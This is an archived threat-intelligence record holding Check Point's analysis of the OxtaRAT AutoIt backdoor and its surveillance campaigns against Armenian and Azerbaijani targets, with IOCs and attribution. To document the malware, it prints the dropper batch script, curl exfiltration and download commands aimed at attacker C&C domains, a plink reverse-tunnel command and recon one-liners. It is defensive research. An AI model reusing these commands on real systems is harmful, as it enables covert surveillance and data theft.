{
    "id": "78831880-1195-4ba5-bf2f-bc01b8952484",
    "created_at": "2023-03-14T02:09:24.172325Z",
    "updated_at": "2025-03-27T02:06:04.205199Z",
    "deleted_at": null,
    "sha1_hash": "b897b76560babe5ea2af500b12ce15160c39944f",
    "title": "Operation Silent Watch: Desktop Surveillance in Azerbaijan and Armenia",
    "authors": "Checkpoint",
    "file_creation_date": "2023-03-13T13:53:48Z",
    "file_modification_date": "2023-03-13T13:53:48Z",
    "file_size": 1255878,
    "plain_text": "# Operation Silent Watch: Desktop Surveillance in Azerbaijan and Armenia\n\n**[research.checkpoint.com/2023/operation-silent-watch-desktop-surveillance-in-azerbaijan-and-armenia](https://research.checkpoint.com/2023/operation-silent-watch-desktop-surveillance-in-azerbaijan-and-armenia/)**\n\n## Executive summary\n\n\nFebruary 16, 2023\n\n\n[Amid rising tensions between Azerbaijan and Armenia over the Lachin corridor in late 2022, Check Point Research identified a malicious](https://edition.cnn.com/2023/01/12/europe/armenia-azerbaijan-nagorno-karabakh-lachin-intl/index.html)\ncampaign against entities in Armenia. The malware distributed in this campaign is a new version of a backdoor we track as OxtaRAT, an\nAutoIt-based tool for remote access and desktop surveillance.\n\n**Key findings:**\n\nThe newest version of OxtaRAT is a polyglot file, which combines compiled AutoIT script and an image. The tool capabilities include\nsearching for and exfiltrating files from the infected machine, recording the video from the web camera and desktop, remotely controlling\nthe compromised machine with TightVNC, installing a web shell, performing port scanning, and more.\nCompared to previous campaigns of this threat actor, the latest campaign from November 2022 presents changes in the infection chain,\nimproved operational security, and new functionality to improve the ways to steal the victim’s data.\nThe threat actors behind these attacks have been targeting human rights organizations, dissidents, and independent media in Azerbaijan\nfor several years. This is the first time there is a clear indication of these attackers using OxtaRAT against Armenian targets and targeting\ncorporate environments.\n\nIn this report, we provide a full technical analysis of the OxtaRAT as well as its capabilities and evolution over the years. We also discuss the\ntactics, techniques and procedures (TTPs) of the threat actors, complete with an overview of their activity throughout the years.\n\n## Background\n\nThe Republic of Artsakh, also known as the Nagorno-Karabakh Republic, is a breakaway region in the South Caucasus with a majority ethnic\nArmenian population but is recognized internationally as part of Azerbaijan. It is a de facto enclave within Azerbaijan, with the only land route\nto Armenia through the Lachin corridor, which has been under the control of Russian peacekeepers since the end of the Second NagornoKarabakh War in 2020.\n\nThe situation in Artsakh is tense, with frequent ceasefire violations and sporadic outbreaks of violence. For more than two decades, this\nunresolved highly militarized ethno-nationalist territorial conflict continues to be a source of tension between Armenia and Azerbaijan.\n\n[Figure 1 – Map of the conflict over Nagorno-Karabakh (Artsakh). Source: CNN.](https://edition.cnn.com/2023/01/12/europe/armenia-azerbaijan-nagorno-karabakh-lachin-intl/index.html)\n\n## The Infection Chain\n\n\n-----\n\nFigure 2 – The infection chain.\n\nA malicious file named `Israeli_NGO_thanks_Artsakh_bank_for_the_support_of.scr was submitted to VirusTotal (VT) on November 29,`\n2022, from an IP address located in Yerevan, Armenia.\n\nIt is a self-extracting archive that masquerades as a PDF file and bears a PDF icon. Upon execution, it drops to the Temp folder of the infected\ndevice and executes a self-extracting cab called `Alexander_Lapshin.EXE . This in turn drops multiple additional files and executes one of`\nthem – the `exec.bat script. In its deobfuscated form, this script is very short:`\n\n@echo off\n\nxcopy /y /e /k /h /i * %appdata%\\Autoit3\\\n\ncopy /b /y %appdata%\\Autoit3\\Alexander_Lapshin.pdf %temp%\\\n\nstart %temp%\\Alexander_Lapshin.pdf\n\nstart %appdata%\\Autoit3\\Autoit3.exe %appdata%\\Autoit3\\icon.png\n\nexit\n\nThe `exec.bat file is responsible for opening a lure PDF file that contains a Wikipedia article about Alexander Lapshin. At the same time, in`\nthe background, it copies multiple auxiliary files and the AutoIt interpreter to `%appdata%\\Autoit3\\ and uses it to execute a malicious AutoIt`\ncode hidden inside an image called `icon.png .`\n\n\n-----\n\nFigure 3 – Lure PDF document.\n\nAlexander Lapshin, a Russian-Israeli travel blogger, journalist, and human rights activist, was detained in Belarus in 2016 and extradited to\nAzerbaijan. He was sentenced to 3 years in prison for illegally crossing the internationally recognized borders of Azerbaijan, without\nauthorization from the Azerbaijani authorities, in 2011 and 2012 while visiting Nagorno-Karabakh from Armenia. Nine months into his\ndetention, in September 2017, Lapshin was attacked in a solitary confinement cell of a Baku pre-trial detention center. The attack was publicly\ndeclared by Azerbaijani officials to be a suicide attempt. Afterward, he was pardoned by the Azerbaijani President and deported to Israel.\n\n[In 2021, the European Court of Human Rights in the “CASE OF LAPSHIN v. AZERBAIJAN” ruled that Lapshin’s right to life had been violated](https://hudoc.echr.coe.int/fre#{%22tabview%22:[%22notice%22],%22itemid%22:[%22001-210045%22]})\n[by Azerbaijan authorities and mandated that Azerbaijan pay 30,000 Euros as compensation. After the verdict, Lapshin publicly posted a](https://www.facebook.com/lapshin/posts/pfbid047bhbtFcrAR7qokkuvgtiTfDgPGaXx54a2qzakeNzeFZusfrJX5md94p6mqpiFiol)\npicture of the credit card he opened to receive his compensation, issued by the Armenian Artsakhbank. Likely, this incident made Lapshin’s\nname an attractive lure for the attackers targeting the bank.\n\n## The OxtaRAT Backdoor\n\nAs we mentioned previously, AutoIT.exe is used to run code from an image called `icon.png . This is a polyglot malware, combining valid`\nJPEG and AutoIT A3X file formats:\n\n\n-----\n\nFigure 4 – Icon.png image and its internal structure.\n\nAutoIT is a legitimate tool that is used by many IT administrators to automate tasks but is frequently abused by threat actors. In this case, the\nactors use a fully functional backdoor containing approximately 20,000 lines of obfuscated AutoIt code:\n\nFigure 5 – Fragment of OxtaRAT code including string obfuscations and random names.\n\nThe backdoor, which we call OxtaRAT, contains a variety of capabilities typically associated with espionage activity. It contains commands that\nallow the attackers to:\n\nRun additional code on the infected machine, install a PHP web shell, download, upload and execute files.\n[Search and exfiltrate files from specific locations or with specific patterns, and even install the PHP FileManager for easier access to and](https://github.com/dulldusk/phpfm)\nmanagement of the files.\nPerform active surveillance activity: record video from a web camera or desktop, and install additional software, such as TightVNC, to\nremotely control and monitor the machine.\nPerform recon on the local machine, such as getting information about the processes, drives, system information, and the speed of the\ninternet connection using Speedtest.\nUse a compromised host as a pivot to move through the network: perform port scanning and use Putty’s plink for tunneled\ncommunication.\n\n## Execution flow\n\nThe backdoor starts by first setting up its base folder, moving the `icon.png file there, and adding a persistence mechanism to run it every 2`\nminutes with AutoIt3.exe via a scheduled task named `WallPaperChangeApp . It also creates a working folder to store the results and logs of`\neach command execution and sets hidden and system attributes for both base and working folders to conceal them from being easily\ndiscovered and arouse suspicion. It also downloads the legitimate curl executable and DLL, which are later used for some types of C&C\ncommunication.\n\nThe C&C server for this sample is `edupoliceam[.]info, a lookalike for the domain of the Police Education Complex of Police of the Republic`\nof Armenia.\n\nNext, the malware enters the main infinite loop, where in each step it performs the following actions:\n\nCreates a screenshot of the infected computer.\nSends a GET request to the C&C server to report the victim’s basic information: `https://edupoliceam[.]info/upload.php?GUID=`\n```\n   <guid>&SYS=PC_Name|User_Name|IP_address .\n\n```\nUploads (using curl) to the C&C server all the files from the working folder which contain screenshots and the results and logs of the\nprevious command execution.\nSends a GET request to C&C server to retrieve the command from the URL: `https://edupoliceam[.]info/upload.php?GUID=`\n```\n   <guid>&come=1 .\n\n```\nMost of the capabilities require additional files, mostly legitimate, to be downloaded during the malware execution from the path on the server\n```\n/requirement/up/bin/ :\n\n```\n\n-----\n\n/requirement/up/bin/postup.exe (curl.exe)\n/requirement/up/bin/libcurl.dll\n/requirement/up/bin/vlc.zip\n/requirement/up/bin/7zxa.dll\n/requirement/up/bin/7za.exe\n/requirement/up/bin/7za.dll\n/requirement/up/bin/pscclient.exe (port scanner)\n/requirement/up/bin/ptun.exe (Plink)\n/requirement/up/bin/wintight.exe (TightVNC)\n/requirement/up/bin/wsrrun.exe (PHP CLI and PHP File Manager, [https://sourceforge.net/projects/phpfm/)](https://sourceforge.net/projects/phpfm/)\n/requirement/up/bin/WinRAR32.zip\n/requirement/up/bin/WinRAR64.zip\n[/requirement/up/bin/speedtest.zip (based on https://github.com/sivel/speedtest-cli)](https://github.com/sivel/speedtest-cli)\n/requirement/up/bin/AppCrashCollector.exe (the “implant”)\n\nThe only next-stage tool that wasn’t available on the server, was `AppCrashCollector.exe, whose download and execution are triggered by`\nthe `implant command. We assume that this is the payload that the actors attempt to hide from researchers and deliver to important targets`\nonly after additional checks are performed on the infected machine.\n\n## C&C communication and commands\n\nThe communication between the malware and its C&C server is based on clear text commands, the arguments for each command are separated\nby the “|” sign.\n\nThe full list of commands supported by the backdoor:\n\n\n-----\n\ncommand parameters description\n\ndownload file name Upload a file using curl (postup.exe): `postup.exe -s -o nul -k --max-time 777 -A`\n```\n                   \"Mozilla/5.0 (Windows NT 11.0; rv:54.0) Gecko/20100101 Firefox/96.1\" -F\n                   \"file=@\"filename\" https://edupoliceam[.]info/upload.php?GUID=<guid> .\n\n```\nupload file name Download a file and save it with a specified filename and random prefix in the Temp directory.\n\nuploadexec file name Download and execute with `wmic /node:%computername%\" process call create`\n```\n                   $output_filename .\n\n```\n\naueval expression to\nbe evaluated\n\n\n[Execute a specified expression with AutoIT command Execute.](https://www.autoitscript.com/autoit3/docs/functions/Execute.htm)\n\n\nsearch path, pattern Search for a pattern in a specified path with `PowerShell -Noni -command '(get-childitem '\" &`\n```\n                   $path & \"' -Recurse -ea 0)| select Fullname | ? {$_.Fullname -like '\" & $pattern &\n                   \"'} | fl .\n\n```\nlistdesktop List the contents of the Desktop folder with `dir /s \"%homepath%\\Desktop .`\n\nlistdir directory path List a specified directory recursively, including the last modified date and size.\n\nmassdownload path, filter Upload files from a specified path with a specified filter (include/exclude), using curl for each file (the\nsame way as the download command), with `&MASSDL=1 parameter in the URL.`\n\nmassdownload2list path, filter List all files in a specified path matching the specified filter to the `Thumb.db file.`\n\nmassdownload2 path, filter, Upload files from a specified path from `Thumb.db with POST request to the URL`\n\n[range] with `&MASSDL2=1 parameter.`\n\nwebcamrecord length Webcam recording using VLC: `$tmp_blcvid & \"\\blc\\vlc\\MediaRun.exe --no-qt-privacy-ask`\n```\n                   dshow:// --sout file/avi:\" & $tmp_blcvid & \"\\webcam-video-record-\" & $timestamp &\n                   \"-sec-\" & $chunk_length & \".avi --run-time=\" & $chunk_length & \" -Idummy --quiet\n                   vlc://quit\" . The records are uploaded zipped using curl and are then deleted.\n\n```\ndesktoprecord length Desktop recording using VLC: `$tmp_blcvid & \"\\blc\\vlc\\MediaRun.exe --no-qt-privacy-ask`\n```\n                   screen:// --sout file/avi:\" & $tmp_blcvid & \"\\Desktop-video-record-\" & $timestamp\n                   & \"-sec-\" & $chunk_length & \".avi --run-time=\" & $chunk_length & \" -Idummy --quiet\n                   vlc://quit\" . The records are uploaded zipped using curl and then deleted.\n\n```\n\nzipit source, zip file\nname,\ndestination,\n\n[filter]\n\nunzipit source,\ndestination\n\n\nZip the folder using `7za.exe .`\n\nUnzip the archive using `7za.exe .`\n\n\ninstallrar Download and unzip WinRAR.\n\n\nrarit source,\ndestination,\n\n[extensions],\n\n[volume_size]\n\nunrarit source,\ndestination\n\n\nArchive the file/files with specific extensions from the folder using WinRAR.\n\nExtract the archive using Unrar.exe.\n\n\ncurl url Execute the curl command: `postup.exe -i -vvv -k --max-time 60 -A \"Mozilla/5.0`\n```\n                   (Windows NT 11.0; rv:54.0) Gecko/20100101 Firefox/96.0.1\" & $url .\n\n```\n\nportscan ip/ip_range,\nport/port_range\n\n\nDownload and execute the portscan script (AutoIT-based `pscclient.exe )`\n\n\n-----\n\ncommand parameters description\n\n\ntunnel server, user,\npassword, port,\nhost,\nhost_port,\nlocal_port\n\n\nDownload, unzip and execute reverse port forwarding with plink: `ptun.exe & $server & \" -P \" &`\n```\n$port & \" -C -R 127.0.0.1:\" & $listen_port & \":\" & $host & \":\" & $host_port & \" -l\n\" & $user & \" -pw \" & $password .\n\n```\n\nwwwserv [Download, unzip and run PHP web server on port 3136 with PHP File Manager. This is done by](https://sourceforge.net/projects/phpfm/)\ndownloading the AutoIT-based `wsrrun.exe which extracts all needed files and executes php CLI`\nas `connectionlessupdate.exe -q -S 127.0.0.1:3136 -t <root folder> -H .`\n\nstopwwwserv Kill the web server with `taskkill /IM connectionle* /F .`\n\nwmicexec process Execute with `'wmic /node:' & %computername% & 'process call create' & $process .`\n\nsysinfo Collect system info with `hostname & ipconfig /all & arp -a & getmac & net use & net`\n```\n                    share & quser /server:localhost & whoami /all & net user & systeminfo & wmic\n                    process get commandline & nslookup myip.opendns.com. resolver1.opendns.com .\n\n```\ngetip Get network drives with PowerShell -ep bypass -command get-psdrive.\n\nshowdrives Get network drives with `powershell -ep bypass -command get-psdrive .`\n\nproclist Get the process list by `wmic process get commandline .`\n\nspeedtest Download, unzip and execute Speedtest.\n\nshowagentversion Return the agent version (version 11 is hardcoded in this specific sample).\n\ntempclean Clean the Temp folder with `rmdir /q /s %temp%, mkdir %temp% .`\n\nradar time Exit if the time since the last call is smaller than the parameter.\n\nexitself Exit.\n\nFor the commands that require output, the final command line that was executed and its output are written to the working directory to the file\nwith `Random(1, 815782) & \"-command-.txt\" name.`\n\n## Previous campaigns\n\nAlthough not widely discussed, previous versions of the OxtaRAT backdoor were used in earlier attacks against Azerbaijani political and human\nrights activists – or, when the targets were not disclosed publicly, their lures referenced Azerbaijan-Armenia tensions around Artsakh. The\nolder versions of OxtaRAT have significantly less functionality than the new variant but contain similar code and names for most of the\ncommands and the same C&C communication pattern.\n\n### June 2021\n\nIn July 2021, Qurium Media [reported that several prominent human rights and political activists in Azerbaijan received targeted phishing](https://www.qurium.org/alerts/phishing-attack-against-azerbaijani-political-and-human-right-activities/)\nemails that lured them to download malware from the Google Drive link. The link led to a password-protected RAR archive (the password was\nspecified in the email) which in turn contained an Auto-IT compiled executable called `“Human Rights Invoice Form Document`\n```\n-2021.exe\" . When executed, it downloaded from the C&C server shoesbuysellone[.]live the main AutoIT malware (md5:\n\n```\n0360185bc6371ae42ca0dffe0a21455d). Although it doesn’t contain a hardcoded “agent version” number, we can clearly see that this is an\nearlier version of OxtaRAT. It has very similar functionality and code, but supports fewer commands (11 in total):\n\ndownload\n\nimplant makepersistent\n\nstopimplant aueval\n\nmassdownload upload\n\nwebcamrecord uploadexec\n\ndesktoprecord wmicexec\n\n### August 2021\n\nIn August 2021, another sample was observed, this time submitted to VirusTotal from Armenia. The file called\n```\nREPORT_ON_THE_AZERBAIJANI_MILLITARY_AGRESSION (Final Updated 2021).scr also bears the PDF icon, and when executed, presents\n\n```\nthe victim with the following PDF lure:\n\n\n-----\n\nFigure 6 – PDF lure for the August 2021 version (md5: ddac9a1189e4b9528d411e07d0e98895).\n\nIn the background, it downloads the main malware from the C&C server `https://www.filecloudservices.xyz/wp-comment.php and`\nsaves it as `PhoneAppService.Exe . The code of this version implements the same string obfuscation as the newest version:`\n\n$koda_gui =\nStringFromASCIIArray(StringSplit(\"77|111|122|105|108|108|97|47|53|46|48|32|40|76|105|110|117|120|59|32|85|59|32|65|110|100|114|111|105|\n\"|\"), 1) // Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0\nMobile Safari/534.30 18.3\n\nFileInstall(\".\\REPORT_ON_THE_AZERBAIJANI_MILLITARY_AGRESSION_AGAINST_ARTSAKH.pdf\", @AppDataDir & \"\\\" &\n\"REPORT_ON_THE_AZERBAIJANI_MILLITARY_AGRESSION_AGAINST_ARTSAKH.pdf\", 1)\n\n$n =\nStringFromASCIIArray(StringSplit(\"104|116|116|112|115|58|47|47|119|119|119|46|102|105|108|101|99|108|111|117|100|115|101|114|118|105|99|10\n\"|\"), 1) //https://www.filecloudservices.xyz/wp-comment.php\n\n$m = StringFromASCIIArray(StringSplit(\"80|104|111|110|101|65|112|112|83|101|114|118|105|99|101|46|69|120|101\", \"|\"), 1)\n//PhoneAppService.Exe\n\nRun(@ComSpec & \" File.txt /\" & \"c \" & StringFromASCIIArray(StringSplit(\"115|116|97|114|116\", \"|\"), 1) & \" \" & @AppDataDir & \"\\\" &\n\"REPORT_ON_THE_AZERBAIJANI_MILLITARY_AGRESSION_AGAINST_ARTSAKH.pdf\", @AppDataDir, @SW_HIDE)\n\nHttpSetUserAgent($koda_gui)\n\nHttpSetProxy(1)\n\nInetGet($n, @TempDir & \"\\\" & $m, 1)\n\n### February 2022\n\n[In February of last year, Qurium reported another attack, this time targeting Abulfaz Gurbanli, an Azerbaijani political activist. The attackers](https://www.qurium.org/alerts/azerbaijan/yet-another-targeted-malware-against-azerbajani-political-activists/)\npretended to be BBC journalists and, similar to the June 2021 attacks, sent the victim an email which contained a Google Drive link, pointing to\na password-protected RAR archive called `BBC-suallar.rar (“BBC questions”). Once again, a AutoIT-compiled executable called`\n```\nsuallar.scr was extracted. This time, it masqueraded as a Word document, complete with a Word icon. Upon execution, it presented the\n\n```\nlure DOC file called `smm-fraza.doc .`\n\nIn the background, it downloaded from the C&C server `https://smartappsfoursix[.]xyz/wp-feed.php and run another version of`\nOxtaRAT. This is a more advanced version, compared to the 2021 attacks, with many additional commands added (29 in total):\n\n\n-----\n\ndownload\naueval\nupload\nuploadexec\nexittemp\nimplant\nstopimplant\nradar\nmassdownload\nwebcamrecord\ndesktoprecord\nmakepersistent\nuntrace\nwwwserv\nstopwwwserv\n\n\ncurl\nreboot\nzipit\nunzipit\ntunnel\ntightvnc\nwmicexec\nsearch\nsysinfo\nshowdrives\ngetip\nlistdesktop\nkilltightvnc\nkilltunnel\n\n\nThe version from June 2021 was capable only of downloading and exfiltrating files, executing the binaries and AutoIT code, and recording data\nfrom the desktop and web camera. In contrast, the version observed in February 2022 is a more powerful malware with a lot of additional\nfeatures. The actors added capabilities to improve local file enumeration (list files on the desktop, search for specific files), collect data about\nthe compromised system, work with zip files, and, most importantly, improved the ways they can access and control the infected machine by\nadding commands to install TightVNC or the PHP web server.\n\n## How does the attack from November 2022 differ from the earlier attacks?\n\n### Infection chain\n\nThe first change that the actors implemented in their latest attack is in the infection chain. Previously, the initial .SCR files, masquerading as\nWord or PDF documents, served only as downloaders. They sent a request to WordPress-like URLs on the C&C server ( wp-feed.php, `wp-`\n```\ncomment.php, etc) and then executed the main malware received from the attackers’ server. In the latest campaign, the .SCR file already\n\n```\ncontains the OxtaRAT backdoor, as a polyglot file. This saves the actors from needing to make additional requests for binaries to the C&C\nserver and attracting unnecessary attention, as well as hides the main malware from being easily discovered on the infected machine, as it looks\nlike a regular image and bypasses type-specific protections.\n\n### Geofencing\n\nThe actors added an additional measure to protect their infrastructure, geofencing the C&C domains that store the auxiliary tools and\nadditional payloads. This is a technique currently used by many experienced threat actors to make sure that the proper execution flow is not\ntriggered by sandboxes or researchers, but only on the targeted machines. In this case, the actors limited their operations to Armenian IP\naddresses.\n\n### Data collection and exfiltration\n\nSince the previous publicly disclosed version, OxtaRAT was updated with 10 additional commands introducing new functionality. Most of the\nnew features aim to improve the ways to steal the victim’s data. For example, they implemented the `listdir command to recursively`\nenumerate the files in a specified folder, collecting additional data such as the last modified date and size. The previously existing command\n```\nmassdownload, which is used to exfiltrate files of predefined types, was also updated with a few new file extensions (marked in bold):\n\"*.mdb;*.accdb;*.rdo;*.ora;*.accda;*.accdr;*.accdt;*.ppt;*.avi;*.pptx;*.odt;*.pdf;*.txt;*.msf;*.docx;*.xml;*.doc;*.rtf;\n\n```\nAs can be seen from this snippet, the actors are now interested in additional file types related to Oracle and Microsoft Access databases. This is\nan interesting development, as it indicates they may be broadening their targets to include corporate networks or specific individuals, as\ncommon private computers rarely contain personal files in DB formats.\n\nThe actors also implemented “advanced” mass-download commands such as the `massdownload2 and` `massdownload2list that allow the`\nactors to enumerate and exfiltrate specified filetypes more conveniently. In addition, they implemented functions to work with RAR archives\n( installrar, `rarit,` `unrarit ) which, along with the clear benefits of uploading the auxiliary tools inside RAR archives to the infected`\nmachines, enable the actors to archive all the files of their interest to the multi-volume RAR archive. The default list of extensions provided in\nthe code of the `rarit exfiltration function shows a focus on documents, pictures, archives, and databases:`\n\nFunc rar_it($source_file_or_dir, $destination_path, $extensions_to_rar =\n\"*.xls;*.xlsx;*.doc;*.docx;*.pdf;*.rar;*.zip;*.tar;*.tar.gz;*.sql;*.txt;*.mdb;*.jpg;*.jpeg;*.accdb\", $parts = \"12M\")\n\nAnother interesting feature included in the most recent version is the `speedtest command which invokes Speedtest CLI, a dedicated tool to`\ntest the speed and performance of an internet connection. As the malware is not only capable of collecting a large quantity of files but also\nrecording video from a web camera and screen, it can produce significantly large outputs with gigabytes of data. Therefore, for the sake of\n\n\n-----\n\nO S C, to de t e e te s ve data e t at o t e acto s e y eeded a way to co t o a d est ate t e up oad a o t e co ected o at o\nto their servers.\n\nThe last feature added to the data collection mechanism is a `proclist command, which uses WMIC to retrieve the command line for each of`\nthe processes. This feature might be used for evasion purposes, so the actors can make sure they are running in an actual environment as\nopposed to a sandbox, as well as to learn more about the software configurations running on the victim’s machine.\n\n### Port Scanning\n\nOne of the unexpected features that we found during this investigation is the portscan tool, which is included only in the newer version of the\nbackdoor. The port scanner, `pscclient.exe, is an Auto-IT based non-obfuscated TCP Connect tool that can scan a specified range of IP`\naddresses and a range of ports. The default range of ports configured in the tool includes both well-known and non-standard ports:\n\nGlobal $port_range[100] = [135, 4444, 136, 137, 138, 139, 20, 21, 22, 23, 80, 443, 445, 8443, 8080, 3131, 3128, 5681, 5060, 5061, 3389, 33899,\n33399, 3390, 389, 4000, 1433, 1521, 9222, 45687, 7292, 789, 50022, 2109, 2233, 55522, 33391, 33392, 33390, 33394, 33389, 33398]\n\nOxtaRAT, which previously had mostly local recon and surveillance capabilities, can now be used as a pivot for active reconnaissance of other\ndevices. This may indicate that the threat actors are preparing to extend their main attack vector, which is currently social engineering, to\ninfrastructure-based attacks. It also might be a sign that the actors are moving from targeting individuals to targeting more complex or\ncorporate environments.\n\n## Infrastructure\n\nOur search for domains with similar characteristics to `edupoliceam[.]info led to more active domains:` `filesindrive[.]info,`\n```\nmediacloud[.]space and avvpassport[.]info . All the domains are registered with NameCheap. While filesindrive[.]info and\nmediacloud[.]space, similar to filecloudservices[.]xyz used in back in 2021, have a generic reference to cloud file storages, the\n\n```\ndomain `avvpassport[.]info is more specific, and it masquerades as the Passport and Visa Office of the Republic of Armenia. Both of these`\ndomains, `edupoliceam[.]info and` `avvpassport[.]info, were created on September 23, 2022, and were likely also used for other attacks`\non Armenian targets.\n\nAt the beginning of our investigation, all of these domains used Cloudflare services to hide their IP addresses. Due to their configuration, by\nlooking for IP addresses with the same behavior, we identified `38.242.197[.]156 as likely their real IP address. While we were completing`\nthe investigation and notifying the relevant parties, Cloudflare blocked these domains as malicious, and they all started to publicly resolve to\ntheir real IP address `38.242.197[.]156 .`\n\n## Targeting and Attribution\n\n[Alexander Lapshin, whose name is used in the lure, shared that on the same day the samples were uploaded to VT, the representatives of](https://www.facebook.com/permalink.php?story_fbid=pfbid02EBSo3mX2da88WfDK1kcTCL9HoD7hjhLfMjG8Fd132QBf37UPagzsPf5iivCit7fwl&id=100036865157039)\n[Artsakh bank notified that they received malicious emails in his name. This information was also later confirmed by Cyberhub-AM, digital](https://cyberhub.am/en/)\nsecurity helpdesk for Armenian civil society. Due to the infrastructure revealed, we believe that there might have been other targets of this\ncampaign in Armenia as well.\n\nFigure 7 – Facebook post by Lapshin (automatic translation).\n\nAll of the samples from this campaign and earlier ones are related to Azerbaijani government interests; they either targeted Azerbaijani\npolitical and human rights activists or, if the targets were not disclosed publicly, reference tensions between Azerbaijan and Armenia over\nArtsakh/Nagorno-Karabakh. Meta, in their [Adversarial Threat Report Q1-2021, attributed the previous campaigns reported by Qurium to the](https://about.fb.com/wp-content/uploads/2022/04/Meta-Quarterly-Adversarial-Threat-Report_Q1-2022.pdf)\nAzeri Ministry of Internal Affairs. However, no technical analyses were provided.\n\nIn 2017, Amnesty International [reported a campaign that started as early as November 2015 and continued through 2017. This campaign used](https://web.archive.org/web/20190416193823/https:/www.amnesty.org/en/latest/research/2017/03/False-Friends-Spearphishing-of-Dissidents-in-Azerbaijan/)\n[Autoit malware called AutoItSpy against Azerbaijani dissidents, and was later connected by Qurium to other “denial-of-service attacks,](https://www.qurium.org/alerts/news-media-websites-attacked-from-governmental-infrastructure-in-azerbaijan/)\nintrusion attempts, spear-phishing campaigns and electronic media monitoring from Internet infrastructure associated with the Government\nof Azerbaijan.” The AutoItSpy malware used at the time had the ability to log the keystrokes and collect screenshots, exfiltrating both of them\nover SMTP protocol.\n\n\n-----\n\nve t oug we cou d t d a y ast uctu e ove ap w t ou ca pa g (co s de g a gap o a ew yea s a d pub c e posu e o p ev ous\nattacks), there is a significant overlap in major TTPs:\n\nThe use of AutoIT malware.\nThe use of files with SCR extensions bearing document-related icons (PDF, Word).\nA focus on surveillance technology (keylogging, screen capture, data exfiltration).\nSimilar consistent targeting.\n\nAlthough it is tricky to compare the code of tools with different functionality (keylogger compared to a full-blown surveillance tool), there are a\nfew high-level overlaps in the coding style of these tools:\n\nThe samples from the AutoItSpy campaign are obfuscated with similar techniques as the OxtaRAT samples from 2022.\nTemporary file names with collected information of AutoItSpy and OxtraRAT both mimic the Windows thumbnail cache:\n\nFigure 8 – “Thumb” in file names of AutoItSpy (top) and OxtraRAT (bottom).\n\nAdditional details such as extensively using `%random% %random% %random% in all the batch scripts, immediately setting file attributes`\nwith `FileSetAttrib($dir, \"+SH\") for all the newly created folders, excessive usage of the` `Random function, etc.`\n\nBased on these similarities in TTPs, code and targeting, we can conclude with medium confidence that both cases involve the same threat\nactors. We can also speculate that the missing “implant” in OxtaRAT that we were unable to access might be a keylogger; not only is it an\nimportant functionality missing from OxtaRAT’s multi-functional surveillance arsenal, but also the actors might take extra measures to avoid\nrevealing it to anyone except the targets, possibly to avoid attribution based on already uncovered information.\n\n## Conclusion\n\nIn this article, we describe the latest attack and the evolution of the tools in the campaigns against Armenian targets, as well as Azerbaijani\nactivists and dissidents. All the details indicate that the underlying threat actors have been maintaining the development of Auto-IT based\nmalware for the last seven years, and are using it in surveillance campaigns whose targets are consistent with Azerbaijani interests.\n\nCheck Point’s [Threat Prevention Engines provides comprehensive coverage of attack tactics, file-types, and operating systems and protects](https://www.checkpoint.com/infinity/zero-day-protection/)\n[against attacks such as described in this research. ThreatCloud is Check Point’s rich cyber defense database. Its threat intelligence powers](https://www.checkpoint.com/infinity/threatcloud/)\nCheck Point’s zero-day protection solutions.\n\nCheck Point products provide the following coverage against this threat:\n\nAnti-Bot: Trojan.WIN32.OxtaRAT.A, Trojan.WIN32.OxtaRAT.B\nThreat Emulation: Trojan.WIN.OxtaRAT.A\n\n## IOCs\n\n\n-----\n\n```\nddac9a1189e4b9528d411e07d0e98895\n\n0360185bc6371ae42ca0dffe0a21455d\n\nddac9a1189e4b9528d411e07d0e98895\n\n1c94f1c6241cb598da5da7150a0dc541\n\ndf9673032789847a367df9923bbd44d2\n\na1a39e458977aa512b7ff2ba1995b18d\n\ncf225029cade918d92b4b4e2b789b7a5\n\n86b5245112436e8a5eabf92fab01ffba\n\nedupoliceam[.]info\n\nfilesindrive[.]info\n\nmediacloud[.]space\n\navvpassport[.]info\n\nfilecloudservices[.]xyz\n\n38.242.197[.]156\n\n```\nGO UP\n[BACK TO ALL POSTS](https://research.checkpoint.com/latest-publications/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/1n31h25d0j5xoqrtyftmx4zuh7njwwje"
    ],
    "report_names": [
        "Checkpoint_Operation-Silent-Watch-Desktop-Surveillance-Azerbaijan-Armenia(02-16-2023)"
    ],
    "threat_actors": [],
    "ts_created_at": 1678759764,
    "ts_updated_at": 1743041164,
    "ts_creation_date": 1678715628,
    "ts_modification_date": 1678715628,
    "files": {
        "pdf": "https://archive.orkl.eu/b897b76560babe5ea2af500b12ce15160c39944f.pdf",
        "text": "https://archive.orkl.eu/b897b76560babe5ea2af500b12ce15160c39944f.txt",
        "img": "https://archive.orkl.eu/b897b76560babe5ea2af500b12ce15160c39944f.jpg"
    }
}